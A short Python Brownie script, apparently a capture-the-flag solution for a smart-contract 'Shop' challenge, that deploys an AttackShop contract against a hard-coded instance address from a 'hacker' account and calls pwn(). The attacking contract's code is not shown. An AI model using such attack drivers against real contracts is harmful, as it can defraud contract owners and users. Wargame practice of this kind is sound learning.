# Import necessary modules
from brownie import accounts, config, AttackShop


# Define main function
def main():
    # Instance Address
    contract = '0xeFA6deeeBaE1fb8c2DE2fe2c89f1Dd5c56C2Ae5F'
    # Create a new account using the private key stored in the config file
    hacker = accounts.add(config['wallets']['from_key'])
    
    attack = AttackShop.deploy(contract,{'from': hacker})
    attack.pwn()

